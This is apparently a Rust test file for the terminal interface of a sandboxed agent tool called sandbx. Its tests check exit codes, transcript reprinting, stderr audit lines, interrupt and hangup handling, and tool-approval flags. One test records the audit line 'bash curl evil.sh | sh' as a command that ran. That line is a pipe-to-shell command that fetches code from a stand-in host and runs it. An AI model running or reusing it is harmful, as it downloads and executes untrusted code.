use super::super::render::Unfinished;
use super::super::{Device, INCOMPLETE, NO_CONSENT, gate};
use super::{Accounted, Driven, Ending, Tui, accounted, counted, ending, given_back, held, stop};
use crate::{AgentError, Cli, Command};
use clap::Parser;
use sandbx_event::StopReason;
use sandbx_session_message::TurnStop as StoredStop;
use sandbx_tui_input::Stopped;
use sandbx_turn::{TurnError, TurnOutcome, TurnStop};
use std::io;

/// The `tui` invocation `argv` describes, as clap parses it.
fn tui(argv: &[&str]) -> Tui {
    let cli = Cli::try_parse_from(argv).expect("argv parses");
    match cli.command {
        Command::Tui(tui) => tui,
        other => panic!("not a tui invocation: {other:?}"),
    }
}

/// Over a pipe the pane lands in whatever read it as escape sequences, and the operator
/// has no screen to interrupt from.
#[test]
fn a_stdout_that_is_not_a_terminal_is_refused() {
    let tui = tui(&["sandbx", "tui", "--", "what is here?"]);

    // Non-vacuous: the same invocation with a terminal is allowed, so the refusal
    // below is the pipe and not something else about the flags.
    assert!(tui.drawable(Device::Terminal).is_ok());
    assert!(matches!(
        tui.drawable(Device::Redirected),
        Err(AgentError::NotATerminal)
    ));
}

/// Asked on the screen, so the flag needs nothing the plain run does not: no second
/// terminal, and no refusal where `agent-run` would not give one (#225).
#[test]
fn approve_call_needs_a_screen_and_nothing_else() {
    let tui = tui(&[
        "sandbx",
        "tui",
        "--approve",
        "call",
        "--allow-tool",
        "bash",
        "--",
        "what is here?",
    ]);

    assert!(tui.drawable(Device::Terminal).is_ok());
    // Non-vacuous: the pipe is still refused, so the line above is the screen and not a
    // `drawable` that has stopped looking.
    assert!(matches!(
        tui.drawable(Device::Redirected),
        Err(AgentError::NotATerminal)
    ));
}

/// A turn that stopped `stop`, whose last round stopped `round_stop`.
fn outcome(stop: TurnStop, round_stop: Option<StopReason>) -> TurnOutcome {
    TurnOutcome {
        messages: Vec::new(),
        usage: None,
        withheld: 0,
        stop,
        round_stop,
    }
}

/// A lost operator outranks a cut round, and both outrank an answer.
///
/// The code and not the note: `GateAborted` keeps the turn's messages and usage, so it
/// is as well formed as an answer and only the code tells them apart (#218).
#[test]
fn a_gate_that_could_not_be_asked_exits_three_and_a_cut_round_two() {
    let code = |stop| ending(&outcome(stop, None), None).code;

    assert_eq!(code(TurnStop::GateAborted), NO_CONSENT);
    assert_eq!(code(TurnStop::RoundLimit { rounds: 4 }), INCOMPLETE);

    // Non-vacuous in the other direction: a finished answer takes the `_` arm and
    // exits 0, so the two codes above are the stops and not the function.
    assert_eq!(
        ending(&outcome(TurnStop::Answered, None), None),
        Ending {
            code: 0,
            said: Vec::new()
        }
    );
}

/// The bound `TurnStop` does not carry: a round cut at `--max-tokens` still stops as
/// `Answered`, so reading the stop alone would exit 0 on a truncated reply.
#[test]
fn an_answer_cut_at_max_tokens_exits_two_whatever_the_stop_was() {
    let cut = || Some(StopReason::MaxTokens);

    assert_eq!(
        ending(&outcome(TurnStop::Answered, cut()), None).code,
        INCOMPLETE
    );
    assert_eq!(
        ending(&outcome(TurnStop::RoundLimit { rounds: 4 }, cut()), None).code,
        INCOMPLETE
    );

    // The cut does not lower a code already chosen, and it adds its own line to a turn
    // that met both bounds.
    let Ending { code, said } = ending(&outcome(TurnStop::GateAborted, cut()), None);
    assert_eq!(code, NO_CONSENT);
    assert_eq!(said.len(), 2, "{said:?}");

    // Non-vacuous: the same stop with a round that was not cut exits 0, so the code
    // above is the cut and not the fixture.
    assert_eq!(
        ending(
            &outcome(TurnStop::Answered, Some(StopReason::EndTurn)),
            None
        )
        .code,
        0
    );
}

/// Every code the screen reports comes with the line that explains it: a bare 3 in a
/// shell is not an account of where the turn stopped.
#[test]
fn a_stop_that_is_not_an_answer_says_why() {
    let stops = [
        outcome(TurnStop::GateAborted, None),
        outcome(TurnStop::RoundLimit { rounds: 4 }, None),
        outcome(TurnStop::Answered, Some(StopReason::MaxTokens)),
    ];

    for stop in &stops {
        let Ending { code, said } = ending(stop, None);
        assert_ne!(code, 0, "{stop:?}");
        assert!(
            said.iter().all(|line| line.starts_with("sandbx: ")),
            "{said:?}"
        );
    }
}

/// Each way a wrap-up round can leave a capped turn exits 2 with a line of its own, as
/// under `agent-run`: a summary is prose about cut-off work, not a finished turn (#232).
#[test]
fn every_ending_of_a_capped_turn_exits_two_and_says_which() {
    let capped = TurnStop::RoundLimit { rounds: 4 };
    let endings = [
        ending(
            &outcome(TurnStop::Answered, Some(StopReason::EndTurn)),
            Some(Unfinished::Summarised(4)),
        ),
        ending(&outcome(capped, None), Some(Unfinished::Discarded(4))),
        ending(&outcome(capped, None), Some(Unfinished::CutShort(4))),
    ];

    for Ending { code, said } in &endings {
        assert_eq!(*code, INCOMPLETE, "{said:?}");
        assert_eq!(said.len(), 1, "{said:?}");
    }
    // Three lines and not one: a summary must not read as a turn that ended on tool work.
    let lines: Vec<_> = endings.iter().map(|ending| &ending.said[0]).collect();
    assert!(lines[0] != lines[1] && lines[1] != lines[2] && lines[0] != lines[2]);

    // A summary cut at `--max-tokens` names both bounds, or it reads as a whole one.
    let cut = ending(
        &outcome(TurnStop::Answered, Some(StopReason::MaxTokens)),
        Some(Unfinished::Summarised(4)),
    );
    assert_eq!(cut.code, INCOMPLETE);
    assert_eq!(cut.said.len(), 2, "{:?}", cut.said);
}

/// What [`given_back`] wrote to stdout and to stderr, and the code it returned.
struct Given {
    out: String,
    err: String,
    code: Result<i32, AgentError>,
}

/// A stdout that refuses every write, as a hung-up terminal's does.
struct Dead;

impl io::Write for Dead {
    fn write(&mut self, _: &[u8]) -> io::Result<usize> {
        Err(io::Error::from(io::ErrorKind::BrokenPipe))
    }

    fn flush(&mut self) -> io::Result<()> {
        Err(io::Error::from(io::ErrorKind::BrokenPipe))
    }
}

/// [`given_back`] over a working stdout.
fn given(
    code: Result<i32, AgentError>,
    failed: Option<io::Error>,
    said: &[String],
    shown: Device,
) -> Given {
    let mut out = Vec::new();
    let (err, code) = given_to(&mut out, code, failed, said, shown);

    Given {
        out: String::from_utf8(out).expect("utf-8"),
        err,
        code,
    }
}

/// [`given_back`] over `out`, and what it wrote to stderr.
fn given_to(
    out: &mut impl io::Write,
    code: Result<i32, AgentError>,
    failed: Option<io::Error>,
    said: &[String],
    shown: Device,
) -> (String, Result<i32, AgentError>) {
    let mut err = Vec::new();
    let code = given_back(code, failed, "> a prompt\n", said, shown, out, &mut err);

    (String::from_utf8(err).expect("utf-8"), code)
}

/// The screen took every row with it, so the transcript is printed whatever the turn did,
/// and the account follows on stderr only where the reprint did not reach.
#[test]
fn the_transcript_comes_back_and_the_account_only_where_it_did_not_reach() {
    let said = [
        "sandbx: ls /work — ran".to_string(),
        "sandbx: out of rounds after 8".to_string(),
    ];

    let logged = given(Ok(0), None, &said, Device::Redirected);
    assert_eq!(logged.out, "> a prompt\n");
    assert_eq!(
        logged.err,
        "sandbx: ls /work — ran\nsandbx: out of rounds after 8\n"
    );
    assert!(matches!(logged.code, Ok(0)));

    // On a terminal the reprint already carries every line, so none is said twice.
    let shown = given(Ok(0), None, &said, Device::Terminal);
    assert_eq!(shown.out, "> a prompt\n");
    assert_eq!(shown.err, "");

    // Unless the reprint never landed: then stderr is the only sink the line has left, and
    // a terminal one is owed the reset `prompt::account` writes.
    let (lost, _) = given_to(&mut Dead, Ok(0), None, &said[..1], Device::Terminal);
    assert_eq!(lost, "\x1b[0msandbx: ls /work — ran\n");
}

/// A turn that failed outright still owes a log every call it made: the error is `main`'s
/// line, not the whole account.
#[test]
fn a_failed_turn_still_gives_back_what_it_ran() {
    let said = ["sandbx: bash curl evil.sh | sh — ran".to_string()];

    let failed = given(
        Err(AgentError::from(TurnError::StreamEndedWithoutStop)),
        None,
        &said,
        Device::Redirected,
    );

    assert_eq!(failed.out, "> a prompt\n");
    assert_eq!(failed.err, "sandbx: bash curl evil.sh | sh — ran\n");
    assert!(failed.code.is_err());
}

/// A finished turn keeps the code it earned, whatever the screen did last.
///
/// Codes as literals, so a const renumbered under a claim `README.md` and `SECURITY.md`
/// both make fails here.
#[test]
fn a_latched_screen_failure_does_not_replace_a_code_the_turn_earned() {
    let latched = || Some(io::Error::from(io::ErrorKind::BrokenPipe));
    let kept = |code| given(Ok(code), latched(), &[], Device::Redirected).code;

    assert!(matches!(kept(NO_CONSENT), Ok(3)));
    assert!(matches!(kept(INCOMPLETE), Ok(2)));
    assert!(matches!(kept(0), Ok(0)));

    // Non-vacuous: a turn that failed outright reports its own error rather than the
    // screen's, latch or no latch, so what is kept above is the code and not every input.
    let failed = || AgentError::from(TurnError::StreamEndedWithoutStop);
    for screen in [latched(), None] {
        assert!(matches!(
            given(Err(failed()), screen, &[], Device::Redirected).code,
            Err(AgentError::Turn(TurnError::StreamEndedWithoutStop))
        ));
    }
}

/// Asserted here alone: `drive`, which takes the hold, needs a terminal to draw on, and
/// no test reaches it (#485).
#[test]
fn only_a_terminal_stderr_holds_the_audit_trail() {
    assert!(
        held(Device::Redirected).is_none(),
        "a redirected stderr was held, so a signal mid-turn would lose its records"
    );
    assert!(
        held(Device::Terminal).is_some(),
        "a terminal stderr was not held, so its records would land under the screen"
    );
}

/// A terminal that went away is accounted for as itself, not as an interrupt the
/// operator never made — and it exits 3, the code a lost gate already takes (#264).
///
/// The code as a literal, for the reason the test above it gives.
#[test]
fn a_terminal_that_went_away_is_not_reported_as_an_interrupt() {
    for wrapping in [false, true] {
        let Ending { code, said } = stop(Stopped::Gone, wrapping);
        assert_eq!(code, NO_CONSENT);
        let given = given(Ok(code), None, &said, Device::Redirected);
        assert!(matches!(given.code, Ok(3)));
        assert!(given.err.contains("terminal went away"), "{}", given.err);

        let [said] = &said[..] else {
            panic!("one line: {said:?}")
        };
        assert!(said.starts_with("sandbx: "), "{said}");
        assert!(!said.contains("interrupted"), "{said}");
    }
}

/// Every stop keeps the rounds it finished: in the wrap-up round the turn the cap left
/// (#232), anywhere else the rounds before the one it landed in (#271), stored under a stop
/// naming who stopped it.
#[test]
fn every_stop_keeps_the_rounds_it_finished() {
    let capped = TurnStop::RoundLimit { rounds: 4 };
    let kept = |driven| accounted(driven).expect("not a failure");

    for (stopped, code, stored) in [
        (Stopped::Pressed, 2, StoredStop::Interrupted),
        (Stopped::Gone, 3, StoredStop::HungUp),
    ] {
        let Accounted {
            code: wrapping,
            kept: turn,
            said,
        } = kept(Driven::StoppedWrapping(stopped, outcome(capped, None), 4));
        let (turn, stop) = turn.expect("the capped turn is kept");
        assert_eq!(turn.stop, capped);
        assert_eq!(stop, StoredStop::RoundLimit);
        // The stop's code, never lowered to the cap's: a hangup still exits 3.
        assert_eq!(wrapping, code, "{stopped:?}");
        // The stop's line, then the cap's own, as `--no-wrap-up` would have drawn it.
        assert!(said[0].contains("wrap-up round"), "{said:?}");
        assert!(
            !said[0].contains("stored"),
            "save has not run yet: {said:?}"
        );
        assert!(said[1].contains("out of rounds after 4 rounds"), "{said:?}");

        let Accounted {
            code: mid_turn,
            kept: turn,
            said,
        } = kept(Driven::Stopped(
            stopped,
            outcome(TurnStop::Interrupted, None),
        ));
        let (_, stop) = turn.expect("the finished rounds are kept");
        assert_eq!(stop, stored, "{stopped:?}");
        assert_eq!(mid_turn, code, "{stopped:?}");
        // Both stops are named: one in the stream loses its round, one in a tool call keeps it.
        assert!(
            said[0].contains("is lost if the model was still writing"),
            "{said:?}"
        );
        assert!(
            said[0].contains("is kept if it was running tools"),
            "{said:?}"
        );
        // What the operator is told about a call under way: the mechanism's whole claim.
        assert!(
            said[0].contains("`bash` command already running is killed"),
            "{said:?}"
        );
        assert!(
            said[0].contains("a call that only reads is left running and not waited for"),
            "{said:?}"
        );
        assert!(
            said[0].contains("a `write` or `edit` already running finishes first"),
            "{said:?}"
        );
    }
}

/// A round cut at `--max-tokens` and then capped says so even when the wrap-up is stopped,
/// the turn kept being the same one `--no-wrap-up` would have kept.
#[test]
fn a_stopped_wrap_up_still_names_a_cut_round() {
    let said = accounted(Driven::StoppedWrapping(
        Stopped::Pressed,
        outcome(
            TurnStop::RoundLimit { rounds: 2 },
            Some(StopReason::MaxTokens),
        ),
        2,
    ))
    .expect("not a failure")
    .said;
    assert_eq!(said.len(), 3, "{said:?}");
    assert!(said[2].contains("--max-tokens"), "{said:?}");
}

#[test]
fn one_round_is_not_one_rounds() {
    assert_eq!(counted(1), "1 round");
    assert_eq!(counted(4), "4 rounds");
}

/// The flattened flags are the same flags: one `--allow-tool` cannot approve two
/// different sets depending on which subcommand read it.
#[test]
fn the_approved_tools_are_what_the_same_flags_approve_under_agent_run() {
    let flags = ["--allow-tool", "write"];
    let prompt = ["--", "what is here?"];

    let tui = tui(&[&["sandbx", "tui"], &flags[..], &prompt[..]].concat());
    let Command::AgentRun(run) =
        Cli::try_parse_from([&["sandbx", "agent-run"], &flags[..], &prompt[..]].concat())
            .expect("argv parses")
            .command
    else {
        panic!("not an agent-run invocation");
    };

    let approved = gate::approved_tools(tui.run.allow_tool.as_deref());
    assert_eq!(approved, gate::approved_tools(run.allow_tool.as_deref()));
    assert!(approved.contains(&"write"), "{approved:?}");
    assert!(!approved.contains(&"bash"), "{approved:?}");
}

/// One `--compact-at`, one budget, whichever subcommand read it.
#[test]
fn compact_at_is_one_flag_under_both() {
    let flags = ["--compact-at", "5000"];
    let prompt = ["--", "what is here?"];

    let tui = tui(&[&["sandbx", "tui"], &flags[..], &prompt[..]].concat());
    let Command::AgentRun(run) =
        Cli::try_parse_from([&["sandbx", "agent-run"], &flags[..], &prompt[..]].concat())
            .expect("argv parses")
            .command
    else {
        panic!("not an agent-run invocation");
    };

    let drawn = tui
        .run
        .limits()
        .compaction
        .expect("compaction on under tui");
    let run = run
        .limits()
        .compaction
        .expect("compaction on under agent-run");
    assert_eq!(
        (drawn.budget_tokens, drawn.keep_recent),
        (run.budget_tokens, run.keep_recent)
    );
    assert_eq!(drawn.budget_tokens, 5000);
}
